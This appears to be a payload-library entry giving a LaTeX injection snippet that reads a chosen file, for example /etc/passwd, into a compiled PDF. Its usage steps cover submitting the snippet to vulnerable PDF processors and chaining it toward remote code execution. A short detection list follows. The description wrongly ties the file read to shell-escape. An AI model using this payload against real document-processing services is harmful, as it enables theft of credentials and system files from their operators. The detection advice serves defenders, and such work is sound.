---
id: 3dbc1237-26f5-44c4-a9c4-e7409171ed86
type: code
language: LaTeX
verified: true
created_at: '2020-03-17T05:50:32.282517+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
  - Windows
tags:
  - RCE
  - file-read
  - known-vulnerability
validated: true
---

# LaTeX-File-Read-Payload

## Code

```latex
\newread\file
\openin\file=/$FULL_PATH_TO_FILE
\read\file to\line
\text{\line}
\closein\file
```

## Description

This LaTeX code snippet exploits shell-escape enabled configurations to read the contents of a target file and embed the first line as text in the generated PDF. It is used in document processing vulnerabilities to exfiltrate sensitive data like configuration files or credentials during PDF compilation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $FULL_PATH_TO_FILE | Full path to the file to read | `/etc/passwd` or `C:\\Windows\\System32\\drivers\\etc\\hosts` |

## Usage

Embed this snippet within a larger .tex document and submit to a vulnerable LaTeX PDF processor. The file content will appear in the output PDF if the read succeeds. Chain with write or execution payloads for full RCE. Test locally with `pdflatex --shell-escape document.tex`.

## Detection

- Scan LaTeX inputs for `\newread`, `\openin`, or `\read` commands.
- Monitor file access logs during PDF generation for unexpected reads (e.g., via auditd or Windows ETW).
- PDF output containing unexpected text from system files.

## Related

- [[procedures/LaTeX-PDF-Read-Write-and-Code-Execution]]
